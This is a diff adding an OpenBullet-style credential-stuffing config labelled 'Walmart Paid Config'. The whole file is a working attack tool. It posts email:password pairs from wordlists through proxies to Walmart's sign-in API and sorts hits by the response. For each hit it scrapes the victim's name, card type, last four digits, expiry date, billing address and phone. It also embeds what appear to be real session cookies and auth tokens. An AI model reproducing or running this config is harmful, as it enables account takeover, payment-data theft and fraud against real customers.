@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "Walmart Paid Config @YashvirGaming0388",
+  "SuggestedBots": 38,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-18T10:09:29.2002098+04:00",
+  "AdditionalInfo": "",
+  "Author": "🔥 YASHVIRGAMING#0388 🔥",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.walmart.com/account/electrode/api/signin?tid=0&returnUrl=%2F" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"rememberme\":true,\"showRememberme\":\"true\",\"captcha\":{\"sensorData\":\"\"}}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "cookie: _pxvid=c0f8a909-2003-11eb-aa95-0242ac120008; DL=94066%2C%2C%2Cip%2C94066%2C%2C; vtc=ah766EJh4Yym8s7iauPT5o; TBV=7; cart-item-count=0; _gcl_au=1.1.1328866680.1606059061; _fbp=fb.1.1606059061217.1890755380; _abck=ji0fzf0adde12y4b2g6n_1718; com.wm.reflector=\"reflectorid:0000000000000000000000@lastupd:1608269391808@firstcreate:1608269391808\"; next-day=null|true|true|null|1608269391; location-data=94066%3ASan%20Bruno%3ACA%3A%3A0%3A0|21k%3B%3B15.22%2C46y%3B%3B16.96%2C1kf%3B%3B19.87%2C1rc%3B%3B23.22%2C46q%3B%3B25.3%2C2nz%3B%3B25.4%2C2b1%3B%3B27.7%2C4bu%3B%3B28.38%2C2er%3B%3B29.12%2C1o1%3B%3B30.14|2|7|1|1xun%3B16%3B0%3B2.44%2C1xtf%3B16%3B1%3B4.42%2C1xwj%3B16%3B2%3B7.04%2C1ygu%3B16%3B3%3B8.47%2C1xwq%3B16%3B4%3B9.21; bstc=Zu6zU9B4DNQSBJ8xNu6u9w; mobileweb=0; xpa=; xpm=3%2B1608269391%2Bah766EJh4Yym8s7iauPT5o~%2B0; TS01b0be75=01538efd7c479912b3c317d2eae564325b6a119e02a9d47e1ee96cd0c6c3b9df861c3b544334690b322eecf73947cd38dead5d65b4; TS013ed49a=01538efd7c479912b3c317d2eae564325b6a119e02a9d47e1ee96cd0c6c3b9df861c3b544334690b322eecf73947cd38dead5d65b4; akavpau_p8=1608269992~id=efad09f240d81ae6e2718fc34982cb7f; __gads=ID=63ec06ade1759524-22ae710f3fc5005e:T=1608269393:S=ALNI_MbbyncewFsMu4V5qkGQLLn36l3-Pw; viq=Walmart; tb_sw_supported=false; _pxff_fp=1; _uetsid=0f3d324040f211eb85badda01caf5157; _uetvid=0f3f1d5040f211eb937a75be8e478960; _px3=f999307239b642802e2a96b2860c4396b96e545dad568e819cf6d64a238e902b:yiCl8lTyRH3y3uo2DiPzRVPw/d5UfuVXU4nKgRaVkvvD80uJD8zjPakt7NKqd0xZyEr9HdkfWrd3HHqy15q0Aw==:1000:oSqFZ7Q+cDeFygCOmap+pPRoVlWJMIhV8oK3FcLyl/KxdnjPz3HemO+Dh6aNFlDs04gb0hz6KqwsNizAiE1J55Lym3D+8iI46k06Gs705Du2/6olnALdFajVgFrfqZxuYRsBP0ht34x6ew7BgGueKqskOxwKXMNjVQ+hXrfZi/E=; _pxde=fe1e02364e842664b93c7435f1c2369fe3108a5057f05ae01dea0949c56bc839:eyJ0aW1lc3RhbXAiOjE2MDgyNjk1MDM1OTgsImZfa2IiOjAsImlwY19pZCI6W119" 
+  HEADER "origin: https://www.walmart.com" 
+  HEADER "referer: https://www.walmart.com/account/login?tid=0&returnUrl=%2F" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\":\"user_auth_fail" 
+    KEY "Your password and email do not match. Please try again or Reset Your Password" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"OK" 
+
+PARSE "<SOURCE>" LR "firstName\":\"" "\"" CreateEmpty=FALSE -> CAP "firstName" 
+
+PARSE "<SOURCE>" LR "lastName\":\"" "\"" CreateEmpty=FALSE -> CAP "lastName" 
+
+REQUEST GET "https://www.walmart.com/account/electrode/account/api/customer/:CID/payment-method" 
+  
+  COOKIE "cookie: _pxvid=c0f8a909-2003-11eb-aa95-0242ac120008; vtc=ah766EJh4Yym8s7iauPT5o; TBV=7; cart-item-count=0; _gcl_au=1.1.1328866680.1606059061; _fbp=fb.1.1606059061217.1890755380; _abck=ji0fzf0adde12y4b2g6n_1718; bstc=Zu6zU9B4DNQSBJ8xNu6u9w; mobileweb=0; xpa=; TS013ed49a=01538efd7c479912b3c317d2eae564325b6a119e02a9d47e1ee96cd0c6c3b9df861c3b544334690b322eecf73947cd38dead5d65b4; __gads=ID=63ec06ade1759524-22ae710f3fc5005e:T=1608269393:S=ALNI_MbbyncewFsMu4V5qkGQLLn36l3-Pw; viq=Walmart; tb_sw_supported=false; wm_ul_plus=INACTIVE|1608356582924; auth=MTAyOTYyMDE44Ojsry2wZLptr0%2FleSkoq6GtUBIFo6qWGGnD0DwaHmbAZ0c%2BH%2F12%2BjGVzjp3GUQRZ%2BLq4jtdXD%2Bx6%2BPw7yecid4kBF6O%2BrN1jwhoD105YKwS0JaGolpE0CpZlbAjFlDtF9NJx0G5Zv1h6NNHg6GcocMnSP9E%2Bv9hsLrW7y%2BhIR7EeP%2FO%2FcsSthC3%2FQLPe%2FM%2BfoEFR6T88B9CXuO1Jto6Y5tUCSTg4E0SEh%2BzCpq1S8zLfCAOP1JNXTClAPbY3l%2Bck4AFflj3p6anSEtYpEDKL0ceUFzaNRaeDwmX42rjMbpjlTAlt6xgAYdDGJUK%2B2j%2B864z9FGd2OC2f5teaWlAourpF08h8Hnh68uZlyfIFalmV%2Bg8OUew2l879VKCClyT4MoEe2sCfNmo%2BgMaizt82w%3D%3D; rtoken=MDgyNTUyMDE4Jko2xIJztvGD%2B3fxPzqQJir57qiju4Uwsl1vxS006WxcqUPD0nVWAvDjbg0Hw73EMKv%2Ffq%2B6rklNvAj0F8woUAz2K7o5pv9bm0le4VKr9iRDt1BfO6%2FDJjFfIV0HGLjyGY9isyNS5ksYMk9ivoDfjZMbiFlsKUyxeoFid1u%2BsYzBE0%2B%2B8gDaTNj7T7ynlMyOdlSIYwVqOAl86XzHZ%2BWJ1sXQWk5UhpFHBB8jKkjWnru5MxhcZwduNv8t2rU9SB5%2BPTKUs2p3MSl%2BOEjQVFhMY3AuD8HdHSrO72waW4ituiAG6bNmiOhG%2BiAGW3sjkkAJrGtEywkm0gSEgyjRMF%2BSa%2BauxkXscoa2MEMOoNU6W%2ByFStGMKdAphrevhq%2F6BfZAHu%2F0KAurO20Z1eIrbvChiUYg%2FnvrHlk%2FTTPMR%2FQBk10%3D; SPID=e7de0a82892c8bee712c8f979fef22222bebc3b6d0250d8c70259239217380620ae8823c34e99b9dc492ed600e482b69wmjet; CID=f218b6c1-4a75-3580-e044-001517f43a86; hasCID=1; customer=%7B%22firstName%22%3A%22Summer%22%2C%22lastNameInitial%22%3A%22S%22%2C%22rememberme%22%3Atrue%7D; type=REGISTERED; WMP=4; oneapp_customer=true; TS01b0be75=01538efd7cc1d7e2ab00d0663f7f80439547316ec884dee54c3d29c20668e5e29a34c6cfe49b0e1891f6fefd58bee2f39dd85278ce; com.wm.reflector=\"reflectorid:0000000000000000000000@lastupd:1608270183262@firstcreate:1608269391808\"; next-day=null|true|true|null|1608270183; location-data=92683%3AWestminster%3ACA%3A%3A8%3A1|uq%3B2%3B%2C1xb%3B%3B1.09%2C36u%3B%3B1.61%2C37v%3B%3B3.35%2C218%3B%3B3.77%2C4cn%3B%3B4.72%2C1xx%3B%3B5.05%2C2e5%3B%3B5.54%2C3vs%3B%3B6.38%2C2e3%3B%3B6.75||7|1|1y6f%3B16%3B2%3B1.6%2C1ycv%3B16%3B6%3B4.09%2C1yr5%3B16%3B10%3B6.23%2C1yij%3B16%3B12%3B6.61%2C1yj8%3B16%3B14%3B7.19; DL=92683%2C%2C%2Cip%2C92683%2C%2C; xpm=3%2B1608270183%2Bah766EJh4Yym8s7iauPT5o~f218b6c1-4a75-3580-e044-001517f43a86%2B0; akavpau_p8=1608270783~id=b5dda03f57087f4e5702282f85617fae; _uetsid=0f3d324040f211eb85badda01caf5157; _uetvid=0f3f1d5040f211eb937a75be8e478960; _px3=9d7c450e9cae41db66308e26159b4d14493e55dcdf7401156a7ad534b2ab7273:cVSyeEqZdTGl1W5KvpM8K/g4cZfMEXQca0V0If1THvMP94yODc6e6YRd+QlucONDfV5pKr0Ovf9KAlPDlkucbQ==:1000:vQQbDTppcCSGNz3164LjL97H75jisGdHeyajrAFFV8pWHBceaf6FAwxMgXhPXM4/RCj8N47H5+OfAy/LLolvksfh5aDNimrfcvh9YuzGiWgPOrO9XkWCmtI5Y0jH/YjNgHftE15EaD64vnANyQ6TRJZrQGi7opbdaKFkJ+EwttQ=; _pxde=f0a354de6d6747d08302d42a043d429ff97dd1ff0fbcd326f60cc84beb703228:eyJ0aW1lc3RhbXAiOjE2MDgyNzAyMDkzMDUsImZfa2IiOjAsImlwY19pZCI6W119; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiY29va2llIiwidXVpZCI6ImY1NjYzOTgwLTQwZjMtMTFlYi04ZDVkLWZkOTFmOThiZmMyYyIsImlhdCI6MTYwODI3MDIxMCwiZXhwIjoxNjEwMDcwMjEwfQ.mDNFlZ4CB8Xg8oYqWtpkE6LIC3i3VuS1L3K3NIQIM28" 
+  HEADER "referer: https://www.walmart.com/account/creditcards" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "cardType\":\"" "\"," CreateEmpty=FALSE -> CAP "CardType" 
+
+PARSE "<SOURCE>" LR "lastFour\":\"" "\"," CreateEmpty=FALSE -> CAP "lastFour" 
+
+PARSE "<SOURCE>" LR "cardExpiryDate\":\"" "\"," CreateEmpty=FALSE -> CAP "cardExpiryDate" 
+
+PARSE "<SOURCE>" LR "addressLineOne\":\"" "\"," CreateEmpty=FALSE -> CAP "address" 
+
+PARSE "<SOURCE>" LR "city\":\"" "," CreateEmpty=FALSE -> CAP "city" 
+
+PARSE "<SOURCE>" LR "state\":\"" "\"," CreateEmpty=FALSE -> CAP "state" 
+
+PARSE "<SOURCE>" LR "postalCode\":\"" "\"," CreateEmpty=FALSE -> CAP "postalCode" 
+
+PARSE "<SOURCE>" LR "phone\":\"" "\"," CreateEmpty=FALSE -> CAP "phone" 
+
+PARSE "<SOURCE>" LR "requiresCvvVerification\":" "}" CreateEmpty=FALSE -> CAP "Cvv" 
+
+FUNCTION Constant "t.me/YashvirGaming0388" -> CAP "Config By " 
+
